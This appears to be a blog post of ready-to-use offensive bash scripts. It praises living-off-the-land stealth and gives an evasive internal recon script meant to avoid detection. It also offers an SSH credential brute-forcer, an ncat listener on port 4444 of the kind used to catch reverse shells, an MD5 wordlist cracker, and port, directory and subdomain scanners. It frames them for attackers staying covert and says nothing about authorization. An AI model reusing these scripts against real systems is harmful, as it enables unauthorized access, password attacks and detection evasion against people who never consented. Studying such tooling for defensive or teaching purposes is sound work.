---
title: "Bash Scripts Stash"
date: "2025-12-19"
excerpt: "A batch of bash scripts for offensive security tasks."
thumbnail: "/thumbnails/bash-scripting.png"
tags: ["Bash", "Offensive Security", "Scripting"]
---

import Head from 'next/head'
import Script from 'next/script'

<Head>
  <title>Bash Highlighting Demo (Prism.js)</title>
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs/themes/prism-tomorrow.min.css" />
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs/plugins/line-numbers/prism-line-numbers.css" />
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs/plugins/toolbar/prism-toolbar.css" />
</Head>

<style jsx global>{`
  :root { --bg:#0f172a; --text:#e5e7eb; --muted:#94a3b8; --card:#111827; --accent:#60a5fa; --radius:10px; --border:#16233b; }
  body { background:var(--bg); color:var(--text); }
  .content { max-width: 960px; margin: 3rem auto; padding: 0 1rem; }
  h1, h2 { line-height: 1.2; margin: 0 0 1rem 0; }
  h1 { font-size: 2rem; }
  p { color: var(--muted); }
  code, pre {
    font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono",
                 "Fira Code", "Cascadia Code", "JetBrains Mono", "DejaVu Sans Mono", monospace;
    font-size: 14px;
    line-height: 1.6;
  }
  pre[class*="language-"] {
    background: var(--card);
    border-radius: var(--radius);
    padding: 1rem 1.25rem;
    box-shadow: 0 1px 2px rgba(0,0,0,0.3), 0 6px 20px rgba(0,0,0,0.25);
    overflow: auto;
  }
  .prism-toolbar { position: absolute; right: 0.5rem; top: 0.5rem; }
  .prism-toolbar button {
    background: #1f2937;
    color: var(--text);
    border: 1px solid #374151;
    border-radius: 6px;
    padding: 0.25rem 0.5rem;
    font-size: 12px;
    cursor: pointer;
  }
  .prism-toolbar button:hover { background: #111827; border-color: #4b5563; }
  .code-wrap { position: relative; margin: 1.25rem 0; }
  .line-numbers .line-numbers-rows > span { border-color: rgba(255, 255, 255, 0.08); }
  code.inline { background: #0b1220; border: 1px solid var(--border); border-radius: 6px; padding: 0.1rem 0.35rem; color: var(--text); }
  .card { background: #0b1220; border: 1px solid var(--border); border-radius: var(--radius); padding: 1rem; margin: 1rem 0 2rem 0; }
`}</style>

- [SSH brute-forcing with sshpass](#ssh-brute-forcing-with-sshpass)
- [Vulnerability scanner](#vulnerability-scanner)
- [Nmap automator](#nmap-automator)
- [Log parser](#log-parser)
- [Listen with netcat](#listen-with-netcat)
- [Hash cracker](#hash-cracker)
- [Banner grabber](#banner-grabber)
- [Web dir buster](#web-dir-buster)
- [Port scanner](#port-scanner)
- [Subdomain scanner](#subdomain-scanner)

Bash scripting is highly valuable in offensive security because it leverages the principle of **living off the land**, using native tools and interpreters already present on target systems rather than introducing foreign binaries that could trigger defenses. This approach minimizes the operational footprint and helps maintain **stealth**, as scripts blend into normal administrative activity. Bash enables **rapid automation** of reconnaissance, **privilege escalation** checks, and **lateral movement** using built-in utilities like curl, wget, grep, and awk, reducing dependency on external frameworks. By chaining these commands in scripts, attackers can execute complex tasks without dropping large executables, making detection harder for signature-based defenses. Ultimately, Bash scripting aligns with **low-noise**, **low-risk** methodologies, allowing operators to remain covert while achieving objectives efficiently.

For example, consider the following code. Why is this "stealthy"?:

- **Living off the land:** Uses utilities commonly present on Linux systems (arp, curl, ss, awk). No external binaries are dropped.
- **Low operating footprint:** Writes to /dev/shm (RAM‑backed) to avoid persistent disk artifacts and reduce I/O.
- **Noise reduction:** Uses HEAD requests, short timeouts, and random jitter; avoids aggressive port scans—prefers passive discovery via ARP.
- **Blends with admin behaviour:** User‑Agent + headers resemble normal browser/admin traffic; slow cadence reduces anomaly spikes.

```bash
#!/usr/bin/env bash
# stealth_enum.sh — low-noise internal web/service reconnaissance
set -Eeuo pipefail

# In-memory scratch space (cleared on reboot on most Linux systems)
SCRATCH=/dev/shm/lotl
mkdir -p "$SCRATCH"

# Quiet logging helper
log() { printf '%s %s\n' "$(date +'%H:%M:%S')" "$*" >> "$SCRATCH/enum.log"; }

# Gentle jitter: 0.7–2.3s
jitter() {
  awk -v seed="$RANDOM" 'BEGIN{srand(seed); print 0.7 + rand()*1.6}'
}

# Candidate hosts from local ARP cache (passive discovery, no scans)
HOSTS_FILE="$SCRATCH/hosts.txt"
arp -n | awk 'NR>1 && $1 ~ /^[0-9.]+$/ {print $1}' | sort -u > "$HOSTS_FILE"

# If none found, quietly exit
[[ -s "$HOSTS_FILE" ]] || { log "No ARP hosts found; exiting."; exit 0; }

# Prefer system CA bundle; use HEAD to minimize content
UA="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122 Safari/537.36"

# Enumerate common web ports very slowly and capture minimal metadata
while read -r host; do
  for port in 80 443 8080 8443; do
    sleep "$(jitter)"
    # 1) TCP reachability with minimal timeout; avoids long hangs
    if timeout 2 bash -c " </dev/tcp/$host/$port" 2>/dev/null; then
      log "open $host:$port"

      # 2) Gentle banner: HEAD with compression and short timeout
      timeout 3 curl -sS --compressed \
        -A "$UA" \
        -H 'Accept: text/html,*/*;q=0.8' \
        -I "http://$host:$port/" 2>/dev/null \
        | awk 'BEGIN{h="";t="";s=""}
               tolower($1)=="server:"{s=$0}
               tolower($1)=="x-powered-by:"{t=$0}
               tolower($1)=="location:"{h=$0}
               END{if(s!="")print s; if(t!="")print t; if(h!="")print h}' \
        >> "$SCRATCH/web_banners.txt"
    fi
  done
done < "$HOSTS_FILE"

# Optional: correlate local listeners without scanning (reads kernel sockets)
# Captures only service names and ports; no payloads
ss -tnlp 2>/dev/null \
  | awk 'NR>1 {split($4,a,":"); if (a[length(a)] ~ /^[0-9]+$/) print a[length(a)], $NF}' \
  >> "$SCRATCH/listeners.txt"

# Minimal terminal output; artifacts kept in-memory
echo "Stealth enum complete. In-memory results:"
echo "  - $SCRATCH/enum.log (open hosts/ports)"
echo "  - $SCRATCH/web_banners.txt (server/x-powered-by/location headers)"
echo "  - $SCRATCH/listeners.txt (local listeners)"

# Clean-up trap (optional: uncomment to delete immediately after viewing# Clean-up trap (optional: uncomment to delete immediately after viewing)
```
So let's dive into some more ready-to-use examples...

<div className="content">

## SSH brute-forcing with sshpass

<div className="code-wrap">

```bash
#!/bin/bash

# Save as ssh_brute.sh. Requires 'sshpass': sudo apt-get install sshpass
# Create users.txt and passwords.txt

if [ -z "$1" ]; then
   echo "Usage: ./ssh_brute.sh <host>"
   exit 1
fi

HOST=$1
USERS="users.txt"
PASSWORDS="passwords.txt"

while read user; do

   while read pass; do
     
      echo "[*] Trying $user:$pass..."

      # sshpass provides the password to the ssh command
      # -o StrictHostKeyChecking=no prevents prompts about new hosts
      # The 'true' command at the end just exits successfully if login works

      if sshpass -p "$pass" ssh -o StrictHostKeyChecking=no "$user@$HOST" "true"; then
         echo "[+] Success! $user:$pass"
         exit 0
      fi

   done < "$PASSWORDS"

done < "$USERS"
```

</div>

## Vulnerability scanner

<div className="code-wrap">

```bash
#!/bin/bash

# Save as vuln_scanner.sh

if [ -z "$1" ]; then
   echo "Usage: ./vuln_scanner.sh <url>"
   exit 1
fi

URL=$1
VULNERABLE_SERVER="Apache/2.4.29"

# 'curl -I' sends a HEAD request to get only headers
# '-s' silences any output
# 'grep -i' makes the search case-insensitive

SERVER_HEADER=$(curl -s -I "$URL" | grep -i "Server:")

echo "[*] Target server header: $SERVER_HEADER"

# Check if the vulnerable string is within the header

if [[ "$SERVER_HEADER" == *"$VULNERABLE_SERVER"* ]]; then

   echo "[!] VULNERABLE: Found outdated server version: $SERVER_HEADER"

elif [[ "$SERVER_HEADER" == *"SimpleHTTP/0.6 Python"* ]]; then

   echo "[+] You are running a simple HTTP server with python, how cute!"

else

   echo "[-] Not found to be vulnerable to this specific check."

fi

```

</div>

## Nmap automator

<div className="code-wrap">

```bash
#!/bin/bash

# Save as nmap_automator.sh
# Create a file named targets.txt

TARGET_FILE="targets.txt"
OUTPUT_DIR="nmap_scans"

mkdir -p "$OUTPUT_DIR" # -p prevents error if directory already exists

while read target; do

   # Skip empty lines

   if [ -z "$target" ]; then continue; fi

   echo "[*] Scanning $target..."

   OUTPUT_FILE="$OUTPUT_DIR/${target}_scan.txt"

   # -oN saves the output in normal format

   nmap -sV -T4 -oN "$OUTPUT_FILE" "$target"

   echo "[+] Scan for $target complete. Results saved to $OUTPUT_FILE"

done < "$TARGET_FILE"

```
</div>

## Log parser

<div className="code-wrap">

```bash
#!/bin/bash

# Save as log_parser.sh
# Create a sample access.log file

LOG_FILE="access.log"

if [ ! -f "$LOG_FILE" ]; then
   echo "Error: $LOG_FILE not found."
   exit 1
fi

echo "Top 10 most frequent IP addresses:"

# 'awk' prints the first field (the IP), sort groups them,
# 'uniq -c' counts unique occurrences, 'sort -nr' sorts numerically in reverse,
# and 'head -n 10' shows the top 10.

awk '{print $1}' "$LOG_FILE" | sort | uniq -c | sort -nr | head -n 10
```

</div>

## Listen with netcat

<div className="code-wrap">

```bash
#!/bin/bash

# Save as listener.sh
# Uses netcat (ncat) to create a powerful listener.

if ! command -v ncat &> /dev/null; then
   echo "netcat (ncat) is not installed. Please install it to use this script."
   exit 1
fi

PORT=4444

echo "[*] Listening on port $PORT..."

# -l for listen mode, -v for verbose, -p for port, -n to skip DNS
# Some versions of nc use -e to execute a program on connect, but for a simple
# interactive shell, this is the most common and reliable form.
# '-k' - keep connection open

ncat -k -lvnp $PORT
```

</div>

## Hash cracker

<div className="code-wrap">

```bash
#!/bin/bash

# Save as hash_cracker.sh
# Requires md5sum command
# sunshine = 0571749e2ac330a7455809c6b0e7af90

if [ -z "$1" ]; then
   echo "Usage: ./hash_cracker.sh <md5_hash>"
   exit 1
fi

HASH_TO_CRACK=$1

WORDLIST="passwords.txt"

while read password; do
   # 'echo -n' prevents a newline character from being part of the hash
   # 'cut' command extracts just the hash part from the md5sum output

   GUESS=$(echo -n "$password" | md5sum | cut -d ' ' -f 1)
   
   if [ "$GUESS" == "$HASH_TO_CRACK" ]; then
      echo "[+] Password found: $password"
      exit 0
   fi
   
done < "$WORDLIST"

echo "[-] Password not found in list."

```
</div>

## Banner grabber

<div className="code-wrap">

```bash
#!/bin/bash
# Save as banner_grabber.sh

if [ -z "$2" ]; then
   echo "Usage: ./banner_grabber.sh <ip> <port>"
   exit 1
fi

IP=$1
PORT=$2

# Use ncat (ncat) if available, a powerful networking utility.
# '-v' for verbose,
# '-n' to skip DNS,
# '-w' for timeout,
# '-z' to just scan.
# For banner grabbing, we use a timeout and pipe an empty string.

if command -v ncat &> /dev/null; then
   echo | ncat -w 2 -v -z "$IP" "$PORT"
else
   # Fallback to the /dev/tcp method if nc isn't installed
   # 'exec 3<>' - opens a bidirectional file descriptor (3) to IP:PORT  
   exec 3<>/dev/tcp/$IP/$PORT

   # Read the first line from the connection
   read -r banner <&3
   
   echo "[+] Port $PORT Banner: $banner"
   # close the descriptor 3 for reading and writing
   exec 3<&-
   exec 3>&-
fi
```

</div>

## Web dir buster

<div className="code-wrap">

```bash
#!/bin/bash

# Save as web_dir_buster.sh
# Create a file named dir_list.txt

if [ -z "$1" ]; then
   echo "Usage: ./web_dir_buster.sh <target_url>"
   echo "Example: ./web_dir_buster.sh http://127.0.0.1"
   exit 1
fi

URL=$1

WORDLIST="dir_list.txt"

while read dir; do
   # 'curl' fetches the URL.
   # '-s' silences progress,
   # '-o' sends output to null,
   # and '-w' tells curl only to print the http status code.
   # '--connect-timeout' handles hangs.

   STATUS=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 3 "$URL/$dir")

   if [ "$STATUS" -ne 404 ]; then
      echo "[+] Found: $URL/$dir [Status: $STATUS]"
   fi

done < "$WORDLIST"
```
</div>

## Port scanner

<div className="code-wrap">

```bash
#!/bin/bash

# Save as port_scanner.sh

if [ -z "$1" ]; then
  echo "Usage: ./port_scanner.sh <ip_address>"
  exit 1
fi

TARGET=$1

PORTS="21 22 80 443 8080"

echo "Scanning $TARGET..."

for port in $PORTS; do
  # This syntax sends nothing to the target but establishes a connection
  # The timeout command prevents it from hanging for too long
  # '(...)' - runs a command inside a subshell, useful isolating the command
  # Bash has a special feature: '/dev/tcp/host/port' - Writing to this pseudo‑file attempts to
  # open a TCP connection to the given host ($TARGET) and port ($port).
  # '&>/dev/null' - silences all output from the subshell

  (timeout 1 bash -c "echo > /dev/tcp/$TARGET/$port") &>/dev/null && echo "[+] Port $port is open"
done
```

</div>

## Subdomain scanner

<div className="code-wrap">

```bash
#!/bin/bash

# Save as subdomain_scanner.sh and run: chmod +x subdomain_scanner.sh

# Requires a subdomains.txt file

# -z = true if length of condition = 0

if [ -z "$1" ]; then
   echo "Usage: ./subdomain_scanner.sh <domain>"
   exit 1
fi

DOMAIN=$1
WORDLIST="subdomains.txt"

# If the wordlist file does not exist, exit

if [ ! -f "$WORDLIST" ]; then
   echo "Error: $WORDLIST not found."
   exit 1
fi

while read sub; do
# The 'host' command performs a DNS lookup. We silence output with &> /dev/null
# '&&' means the second command only runs if the first succeeds
# '&>' - pipe standard output and errors to /dev/null

  host "$sub.$DOMAIN" &> /dev/null && echo "[+] Found: $sub.$DOMAIN"
done < "$WORDLIST"
```

</div>

</div>

{/* Prism core + language + plugins */}
<Script src="https://cdn.jsdelivr.net/npm/prismjs/prism.min.js" strategy="afterInteractive" />
<Script src="https://cdn.jsdelivr.net/npm/prismjs/components/prism-bash.min.js" strategy="afterInteractive" />
<Script src="https://cdn.jsdelivr.net/npm/prismjs/plugins/line-numbers/prism-line-numbers.min.js" strategy="afterInteractive" />
<Script src="https://cdn.jsdelivr.net/npm/prismjs/plugins/toolbar/prism-toolbar.min.js" strategy="afterInteractive" />
<Script src="https://cdn.jsdelivr.net/npm/prismjs/plugins/copy-to-clipboard/prism-copy-to-clipboard.min.js" strategy="afterInteractive" />
